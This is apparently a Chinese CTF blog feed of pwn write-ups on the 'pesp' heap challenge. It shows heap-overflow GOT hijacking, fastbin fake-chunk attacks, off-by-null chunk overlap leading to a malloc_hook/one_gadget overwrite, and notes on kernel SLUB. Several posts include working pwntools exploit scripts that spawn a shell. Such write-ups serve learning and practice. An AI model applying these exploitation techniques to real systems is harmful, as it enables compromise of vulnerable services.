+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/pesp_heap-overflow/">pesp_heap-overflow</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.常规checksec，开了canary和NX，Partial RELRO。开IDA找漏洞，change函数中存在堆溢出:</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">int v0; // ST08_4</span><br><span class="line">char nptr; // [rsp+20h] [rbp-10h]</span><br><span class="line">char buf; // [rsp+10h] [rbp-20h]</span><br><span class="line">----------------------------------------------------------</span><br><span class="line">printf(&quot;Please enter the index of servant:&quot;);</span><br><span class="line">read(0, &amp;buf, 8uLL);</span><br><span class="line">v2 = atoi(&amp;buf);</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">printf(&quot;Please enter the length of servant name:&quot;, &amp;buf);</span><br><span class="line">read(0, &amp;nptr, 8uLL);</span><br><span class="line">v0 = atoi(&amp;nptr);</span><br></pre></td></tr></table></div></figure>
+
+<p>可以发现change函数中，并没有检查堆块的大小，我们输入多少，它就认为是多少，所以这里可以制造堆溢出。</p>
+<p>2.这题有很多其它漏洞，这里先只利用堆溢出来思考下。</p>
+<p>(1)先申请两个chunk，chunk1和chunk2，然后修改chunk1的大小和内容，使得溢出数据，将chunk2的fd改成got表中地址，之后释放掉chunk2，使其在fastbins中的结构为:</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">fastbins-&gt;chunk2</span><br><span class="line">chunk2.fd=got_addr。</span><br></pre></td></tr></table></div></figure>
+
+<p>这样就可以再申请chunk_a，chunk_b，这里的chunk_a就是从fastbins中申请回来的chun2，而chunk_b的首地址就是got_addr。之后通过修改chunk_b的内容，这样就可以修改got表中的内容，从而劫持got表。</p>
+<p>(2)由于这里引入了printf函数，所以可以将free函数的got表劫持为printf(plt)函数，这样就可以在free一个chunk时制造格式化字符串漏洞，通过修改chunk内容为需要的格式化字符之后，再通过该格式化字符串漏洞泄露栈上某函数的Libc地址，从而计算得到libc基地址，从而计算得到system函数真实地址。</p>
+<p>(3)之后再通过上述方法，将free_got劫持为system_real_addr，之后释放一个内容为binsh字符串的chunk，就相当于调用system(“/bin/sh”)，从而getshell。</p>
+<p>3.开始编写payload</p>
+<p>(1)首先确定增删改查函数：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">    io.sendlineafter(&quot;choice:&quot;,&quot;1&quot;)</span><br><span class="line"></span><br><span class="line">def add(length,cont):</span><br><span class="line">    io.sendlineafter(&quot;choice:&quot;,&quot;2&quot;)</span><br><span class="line">    io.sendlineafter(&quot;:&quot;,str(length))</span><br><span class="line">    io.sendafter(&quot;:&quot;,cont)</span><br><span class="line">    sleep(0.01)</span><br><span class="line"></span><br><span class="line">def edit(idx,length,cont):</span><br><span class="line">    io.sendlineafter(&quot;choice:&quot;,&quot;3&quot;)</span><br><span class="line">    io.sendlineafter(&quot;:&quot;,str(idx))</span><br><span class="line">    io.sendlineafter(&quot;:&quot;,str(length))</span><br><span class="line">    io.sendafter(&quot;:&quot;,cont)</span><br><span class="line">    sleep(0.01)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    io.sendlineafter(&quot;choice:&quot;,&quot;4&quot;)</span><br><span class="line">    io.sendlineafter(&quot;:&quot;,str(idx))</span><br></pre></td></tr></table></div></figure>
+
+<p>(2)尝试修改got表，制造格式化字符串溢出漏洞</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#申请三个chunk，chunk0,chunk1,chunk2包括之后需要的格式化字符。</span><br><span class="line">add(0x50,&#x27;000000&#x27;)</span><br><span class="line">add(0x50,&#x27;111111&#x27;)</span><br><span class="line">add(0x10,&quot;.%17$p.&quot;)</span><br><span class="line">#64位程序，将断点下在change函数中的call free，观察此时栈中数据，可以发现从rsp往下数12是libc_main_addr，计算偏移为12+6-1=17.</span><br><span class="line"></span><br><span class="line">#释放chunk1,之后修改chunk1的fd位使其指向fakechunk</span><br><span class="line">delete(1)</span><br><span class="line">edit(0,0x100,flat(&#x27;0&#x27;*0x50,&#x27;00000000&#x27;,0x61,0x601ffa))</span><br><span class="line">#这里两条代码顺序不能改变，因为当chunk1被释放时，其fd位会发生改变，指向0x0，第一个进入fastbins的chunk其fd只要不被修改，一直都是指向0x0。所以需要先释放，再修改，防止之后fd被修改指向0x0。</span><br><span class="line">#现在fastbins为:fastbinsY[0]-&gt;chunk1-&gt;fakechunk</span><br><span class="line"></span><br><span class="line">#连续申请两个chunk，将chunk1和fakechunk申请回来，同时劫持got表，将free函数的got表值改成printf的plt表值，调用plt表中代码，从而调用printf函数。</span><br><span class="line">add(0x50,&#x27;xxxxxxxx&#x27;)</span><br><span class="line">add(0x50,flat(&quot;\0&quot;*0xe,flat(elf.sym[&quot;printf&quot;])[:6]))#get fakechunk,change got</span><br><span class="line"></span><br><span class="line">#释放chunk2，触发free函数，也就是劫持后的printf函数，得到栈上地址libc_main_addr，计算得到libc_address</span><br><span class="line">delete(2)</span><br><span class="line">io.recvuntil(&quot;.&quot;)</span><br><span class="line">temp = io.recvuntil(&quot;.&quot;,drop=True)</span><br><span class="line">libc_address = int(temp,16) - 0x20840</span><br></pre></td></tr></table></div></figure>
+
+<p>(3)再次劫持got表为system函数，释放Binsh字符chunk，getshell</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">#这里的chunk3就是fakechunk，也就是got表</span><br><span class="line">edit(3,0x50,flat(&#x27;\0&#x27;*14,flat(libc_address+libc.sym[&#x27;system&#x27;])[:6]))</span><br><span class="line">add(0x10,&quot;/bin/sh\0&quot;)</span><br><span class="line">#由于前一个释放的是chunk2，所以这里再次申请回来的索引还是2，可以多次运行程序尝试就可以知道，当前面某个的chunk为空时，申请的chunk会先填满前面的空的chunk索引。</span><br><span class="line">delete(2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>
+
+<p>▲制造fakechunk时，需要设置合法的size，不然如果fastbins中的chunk.fd指向fakechunk，而fakechunk的大小又不是该fastbins组中，那么程序会崩溃。所以在最开始设置大小时，就需要好好计算以下，通过调试看看got表中在free函数前能不能找到还没被延迟绑定的函数可以确定计算大小，或者看其它函数的got表最后三位也可以，这样才能制造合法size使得程序不会崩溃。这里用到的0x601ffa就是调试过程中发现能用的，并且还需要填充0xe，也就是14个字节。</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/pesp-heap_overflow-struct/">pesp-heap_overflow-struct</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.第三种方法，通过堆溢出直接改struct，然后更改结构体chunklist[0].chunk中保存的chunk地址，使其指向free_got_addr，再通过程序中的show函数就可以泄露出free_got_addr中保存的free真实地址，从而获得libc的基地址。当然，这得要求先有一个free来让free的延迟绑定发生。</p>
+<p>2.由于这里的chunk地址已经变成free_got_addr，所以当我们修改该chunk的内容时，就相当于修改got表中值，也就修改了真实函数地址的值。这里就可以通过修改该chunk内容来劫持free的got表为system函数真实地址，从而free一个内容为binsh的chunk来getshell。</p>
+<p>3.编写exp，增删改查函数就不多说了。</p>
+<p>(1)申请三个chunk，先将chunk1释放，之后chunk0用来堆溢出，修改chunk1的fd，进行fastbins攻击，将fakechunk放在struct前面某个位置。这里用到字节错位，原理一样，利用0x7f来攻击fastbins。再连续申请两个chunk，chunk1和chunk3就回来，这里的chunk3就是fakechunk了。现在就可以修改fakechunk从而修改掉chunklist[0].chunk的值，使其指向free_got_addr。从而调用show函数泄露free的真实地址。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">add(0x60,&quot;\x00&quot;*0x60) #chunk0</span><br><span class="line">add(0x60,&quot;\x11&quot;*0x60) #chunk1</span><br><span class="line">add(0x60,&#x27;/bin/sh\x00&#x27;) #chunk2 binsh</span><br><span class="line"></span><br><span class="line">remove(1)</span><br><span class="line">change(0,0x100,flat(&quot;\x00&quot;*0x60,p64(0),p64(0x71),p64(bss)))#chunk0_overflow</span><br><span class="line">add(0x60,&quot;\x11&quot;*0x60)#get chunk1</span><br><span class="line">add(0x60,flat(&quot;\x00&quot;*0x3,p64(0x100),p64(free_got_addr)))#get fakechunk</span><br><span class="line">show()</span><br><span class="line">io.recvuntil(&quot;0 : &quot;)</span><br><span class="line">libc_base = u64(io.recv(6).ljust(8,&#x27;\x00&#x27;)) - libc.sym[&#x27;free&#x27;]</span><br></pre></td></tr></table></div></figure>
+
+<p>(2)再修改chunk0的内容为system真实地址，这样就相当于劫持free的got表，之后释放掉chunk2即可getshell。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">system_libc = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">puts = libc_base + libc.sym[&#x27;puts&#x27;]</span><br><span class="line">change(0,0x100,flat(p64(system_libc,),p64(puts)))</span><br><span class="line">remove(2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>
+
+<p>▲需要注意的一点就是，由于read函数读取，所以我们发送数据时一定会有一个\x0a加入进去，这里如果不考虑进入，free函数后面就是put函数，那么就会造成put函数的Got表被更改，从而无法成功调用put函数。而程序在循环体中的菜单部分又一定会调用put函数，那么这样就会造成程序崩溃。所以需要将put函数也加入进去，但是这样又会造成put函数下一个函数被覆盖\x0a。不过不要紧，gdb调试可以看到put函数下一个函数是stack_chk_fail函数，也就是检查canary出错时才会调用。我们有没有栈溢出修改canary，这个函数当然不会被调用，程序就不会崩溃。</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/pwn-kernel_Heap%E6%80%BB%E7%BB%93/">pwn-kernel_Heap总结</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>一、SLUB和SLAB：内核的堆比用户的堆会简单很多，需要了解一些机制。</p>
+<p>1.分配的大小：也是类似对齐的，但也有点不同</p>
+<p>linux下查看命令：cat /proc/slabinfo</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_12-46-27.png" alt="img"></p>
+<p>可以看到kmalloc分为很多的大小，从大到小分别为8k-&gt;8字节，每个都相当于是一个桶，里面存储所有的空闲块或者非空闲块。所以当我们分配17字节时，得到的空间其实是32字节，5K字节得到的是8K字节的空间。这个在用堆溢出的时候需要用到。</p>
+<p>2.管理机制：单链表结构</p>
+<p>(1)申请原则：</p>
+<p>以一定大小的空闲chunk作为一个单链表，以fd串联，并且chunk的结构只有一个fd，不像用户态中有有头结构：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_15-14-21.png" alt="img"></p>
+<p>如果申请期间改变了空闲链表第一个chunk的fd，那么再申请一次得到该chunk，然后再申请就得到修改后的fd。如上图，如果0xffff8880029f8000是对应slub桶大小的chunk空闲链表第一个，那么申请该大小chunk后得到的是0xffff8880029f8000，再申请一次就会得到0x6bc360。</p>
+<p>▲这个具体的管理结构不知道在哪，但是如果再申请该大小的chunk：</p>
+<p>①0x6bc360在被申请出来之前，其fd为一个有效的可用地址，比如</p>
+<p>0x6bc360 –&gt; 0x6bc460，那么就会得到连续得到0x6bc360和0x6bc460。</p>
+<p>②0x6bc360在被申请出来之前，其fd为0，比如</p>
+<p>0x6bc360 –&gt; 0x0，那么先得到0x6bc360，然后会从另一个桶中申请chunk，该大小的空闲链表桶就会废弃不再使用，相当于系统默认该桶用完。之后再申请该大小的chunk会从新桶中继续申请。</p>
+<p>③0x6bc360在被申请出来之前，其fd为无效地址，比如</p>
+<p>0x6bc360 –&gt; 0x40，那么先得到0x6bc360，然后再申请，系统就会崩溃。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_15-25-50.png" alt="img"></p>
+<p>(2)释放原则：</p>
+<p>同样是以一定大小的空闲chunk作为一个单链表，以fd串联，也类似fastbin结构，先进后出：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_15-38-53.png" alt="img"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_15-39-01.png" alt="img"></p>
+<p>这里可以看到，释放完三个chunk之后，再申请，会先得到chunk0，再得到chunk2，chunk1。所以这里也同样可以看出，在释放之后，该chunk的fd会被改写，指向下一个空闲chunk。只不过不用看size和其他七七八八的检查，只用fd即可打类似fastbin的攻击了，方便了很多。</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/pesp_off-by-null/">pesp_off-by-null</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.还是之前的2018网鼎杯的pesp题目。这里假设没有堆溢出，有PIE保护，无法劫持got表。只使用0字节溢出漏洞来获取libc地址，再根据得到的libc地址来更改malloc_hook和realloc_hook里面保存的地址为one_gadget，一步getshell。(realloc_hook为onegadget，malloc_hook为__libc_realloc函数中调整栈帧的地方)</p>
+<p>2.先梳理一下0字节溢出漏洞，一般的chunk改内容都是：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">read(0, chunk_ptr, size);</span><br></pre></td></tr></table></div></figure>
+
+<p>这样就只能输入size这么大的内容，但是这道题中，在add函数中和change函数中：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536207.jpeg" alt="img"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536488.jpeg" alt="img"></p>
+<p>可以看到给chunk添加内容的语句都是：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">*(itemlist[i].cont + read(0, itemlist[i].cont, len)) = 0;// off by null</span><br></pre></td></tr></table></div></figure>
+
+<p>这样当我们将chunk内容顶满之后，程序会将chunk指针最后部分再溢出一个字节赋值为0，这就是off-by-null。</p>
+<p>由于scanf函数会在末尾自动补\x00，这其实也是一种off-by-null，</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">char buf[10];</span><br><span class="line">scanf(&quot;10%s&quot;,buf);</span><br></pre></td></tr></table></div></figure>
+
+<p>▲free源码：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">if (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((long ) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>也就是如果当前chunk的IN_USE位为0，那么就根据当前chunk的pre_size位，找到前一个chunk_pre，将chunk_pre的size位改成size+pre_size，通过Unlink取出chunk_pre，准备合并。(之后的检查代码会再循环，也就是再看chunk_pre的IN_USE位是不是0来判断要不要再向上合并，这里不重要)</p>
+<p>所以如果我们通过off-by-null，溢出0到chunk_next的size位中的IN_USE位，那么当前chunk就会被标记为Free，这样在Free(chunk_next)时，就会将chunk和chunk_next合并。如果我们又更改了chunk_next的pre_size位，使它变得更大，那么就可以向上合并更大的chunk块。这就是off-by-null的利用方法，这题中如下：</p>
+<p>(需要注意的是，由于溢出的是一个字节而不是一个Bit，所以size一般都设置为0xf0，从而使size位变成0x101，溢出之后进而变成0x100。但如果size最开始设置为0x20，size位就是0x30，溢出0字节就会变成0x00，那样程序照样崩溃。)</p>
+<p>(1)先申请四个chunk，分别为chunk0,chunk1,chunk2,chunk3。(chunk3防止合并用)</p>
+<p>(2)然后free掉chunk0，(这里chunk0需要足够大，一般得大于0x80，也就是MAX_fastbins)，使其进入unsortedbins中。(这里必须free掉chunk0，不然之后修改掉chunk2的pre_size位时，然后free掉chunk2时，程序依据pre_size来判断是否合并时，发现chunk0仍旧处于使用当中，但pre_size包含了chunk0，就会造成程序崩溃)</p>
+<p>(3)修改chunk1的最后八个字节，也就是chunk2的pre_size位，使得chunk2的pre_size位的大小为chunk0_size+chunk1_size。</p>
+<p>(4)free掉chunk2，使得chunk0,chunk1,chunk2三个chunk作为一个整体被合并之后放入到unsortedbins中，调试过程可以发现，chunk0的size位被修改成了sizeof(chunk0+chunk1+chunk2)。但是这里实际情况中，chunk1并没有被释放，只是它的内存处在被释放的内存中间，依然可以通过chunk1的指针来操作。也就是在这个程序中依旧可以进行edit来修改chunk1，或者show来打印chunk1。</p>
+<p>(5)再次申请chunk0大小，这样就会割裂unsortedbins中的remainder为chunk0+new_remainder，把chunk0申请回来，剩下的new_remainder依旧放在unsortedbins中。在unsortedbins中的remainder有个特点，就是该chunk的fd和bk一定指向unsortedbins链表头部，(如果有多个remainder，那么顺序类似于smallbins，依旧可以使用第一个chunk的bk来获取unsortedbins链表头部)</p>
+<p>(6)那么现在unsortedbins中有chunk1和chunk2，而chunk1的fd和bk都指向unsortedbins链表头部，并且在程序中chunk1仍旧处于使用状态，fd和bk就是chunk1的data部分。所以show函数就可以打印出chunk1的data部分，从而打印出fd和bk指向的unsortedbins头部链表地址。又由于unsortedbins处在main_arena+0x58位置，而main_arena相对于libc基地址的偏移是固定的，为0x3c4b20(不同glibc版本可能不同，这是libc2.23的)，所以这也就间接泄露出了libc基地址。</p>
+<p>▲查询main_arena方法：</p>
+<p>①工具查询：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/coldwave96/libcoffset%EF%BC%9A" >https://github.com/coldwave96/libcoffset：</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>②IDA查询：main_arena存储在libc.so.6文件的.data段，使用IDA打开libc文件，然后搜索函数malloc_trim()</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191537434.jpeg" alt="img"></p>
+<p>3.现在有了libc基地址，那么接下来就考虑修改mallo_hook和realloc_hook的值。同样使用0字节溢出漏洞，伪造fakechunk为mallo_hook地址，修改fakechunk从而修改malloc_hook和realloc_hook。这里先忽略上面的，程序中的索引会不太一样。攻击思路如下：</p>
+<p>(1)先申请一个较大的chunk，防止和上面的合并</p>
+<p>(2)之后的操作方法类似，先申请四个chunk，分别为chunk0,chunk1,chunk2,chunk3。(chunk3防止合并用)</p>
+<p>(3)free掉chunk0，使其进入unsortedbins中。修改chunk1的最后八个字节，也就是chunk2的pre_size位，使得chunk2的pre_size位的大小为chunk0_size+chunk1_size。</p>
+<p>(4)free掉chunk2，使得chunk0,chunk1,chunk2三个chunk作为一个整体被合并之后放入到unsortedbins中。再free掉chunk1，使其进入fastbins中。这样chunk1即在fastbins中，也处在unsortedbins中。</p>
+<p>(5)申请一个特殊大小的chunk块，最小为chunk0_size+0x20，使其的data部分足够大，能够修改掉chunk1的fd位，将chunk1的fd位指向fakechunk，由于需要从size位覆盖到fd，所以需要伪造合法的size，为chunk1_size。</p>
+<p>(6)申请两个chunk1大小的chunk_a，chunk_b，这样第一次申请的chunk_a就是从fastbins中回来的chunk1。而chunk_b就是chunk1的fd指向的fakechunk。这样如果将fakechunk放在realloc_hook之前，那么就可以修改掉realloc_hook和malloc_hook，使得realloc_hook指向one_gadget，而malloc_hook指向__libc_libc函数中的某个可以控制栈帧的地址，从而满足gadget条件来getshell。</p>
+<p>4.开始编写exp，增删改查函数就不说了:</p>
+<p>(1)获取libc基地址：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">add(0xf0,&#x27;0&#x27;*0xf0)</span><br><span class="line">add(0x68,&#x27;1&#x27;*0x68)#trigger 0ff-by-null</span><br><span class="line">add(0xf0,&#x27;2&#x27;*0xf0)</span><br><span class="line">add(0x10,&#x27;3&#x27;*0x10)</span><br><span class="line">#chunk0,chunk1,chunk2,chunk3(防止合并)</span><br><span class="line"></span><br><span class="line">delete(0)#防止程序崩溃</span><br><span class="line">edit(1,0x68,flat(&#x27;1&#x27;*0x60,0x170))</span><br><span class="line">#修改chunk2的pre_size，使得chunk0,chunk1,chunk3手牵手进入unsortedbins中</span><br><span class="line">delete(2)</span><br><span class="line">#触发chunk2的pre_size作用</span><br><span class="line"></span><br><span class="line">#关键就在这个add，目的就是将unsortedbins的链表头部放到chunk1的fd和bk位</span><br><span class="line">add(0xf0,&#x27;x&#x27;*0x10)</span><br><span class="line"></span><br><span class="line">#现在就可以打印chunk1来获取unsortedbins链表的头部地址，从而计算得到libc地址</span><br><span class="line">show()</span><br><span class="line">libc_address = u64(io.recvuntil(&quot;\x7f&quot;)[-6: ]+&#x27;\0\0&#x27;)-0x3c4b78</span><br><span class="line">print(&quot;libc @ &#123;:#x&#125;&quot;.format(libc_address))</span><br></pre></td></tr></table></div></figure>
+
+<p>(2)伪造fakechunk：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">add(0x160,&#x27;4&#x27;*0x160)</span><br><span class="line">#第一个chunk防止合并加程序崩溃</span><br><span class="line"></span><br><span class="line">add(0xf0,&#x27;a&#x27;*0xf0)</span><br><span class="line">add(0x68,&#x27;b&#x27;*0x68)</span><br><span class="line">add(0xf0,&#x27;c&#x27;*0xf0)</span><br><span class="line">add(0x10,&#x27;d&#x27;*0x10)</span><br><span class="line">#四个chunk，套路一样。由于程序编写原因，所以索引变成chunk4,chunk5,chunk6,chunk7,对应上面的chunk0,chunk1,chunk2,chunk3。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(4)#防止程序崩溃</span><br><span class="line">edit(5,0x68,flat(&#x27;b&#x27;*0x60,0x170))</span><br><span class="line">#修改chunk2的pre_size，使得chunk0,chunk1,chunk3手牵手进入unsortedbins中</span><br><span class="line">delete(6)</span><br><span class="line">#触发chunk6的pre_size作用</span><br><span class="line"></span><br><span class="line">delete(5)</span><br><span class="line">add(0x120,flat(&#x27;A&#x27;*0xf8,0x70,(libc_address+0x3c4aed)))</span><br><span class="line">#使得chunk5进入fastbins，之后修改其fd位，创造一个fakechunk进入fastbins。这里的fakechunk_addr就是libc_address+0x3c4aed。这里的0x70写成0x71也是一样的，因为之后是malloc，不会管chunk的IN_USE位，也就是P位。</span><br></pre></td></tr></table></div></figure>
+
+<p>(3)申请获得fakechunk，同时修改该fakechunk，劫持malloc_hook和realloc_hook。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">add(0x68,&#x27;x&#x27;*0x10)</span><br><span class="line">add(0x68,flat(&#x27;\0&#x27;*11,(libc_address+one_gadget),(libc_address+16+libc.sym[&quot;__libc_realloc&quot;])))</span><br></pre></td></tr></table></div></figure>
+
+<p>(4)随便申请一个chunk即可getshell，但是这里不要使用之前我们定义的add函数，因为程序一旦call malloc即可getshell，即运行到输入长度即可，但是我们的add函数中一直运行到输入内容才结束，会导致程序卡住，所以应该是：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&quot;choice:&quot;,&quot;2&quot;)</span><br><span class="line">io.sendlineafter(&quot;:&quot;,&quot;anything&quot;)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>
+
+<p>5.这里需要很多调试的步骤：</p>
+<p>(1)从最开始打算伪造fakechunk时就应该知道我们的chunk大小应该设置为0x68，因为程序跑起来是0x7f开头，拿来伪造size再合适不过，这样的chunk大小是0x70。而我们又只能用0字节溢出，所以需要将chunk设置到最大，也就是0x70-0x08。</p>
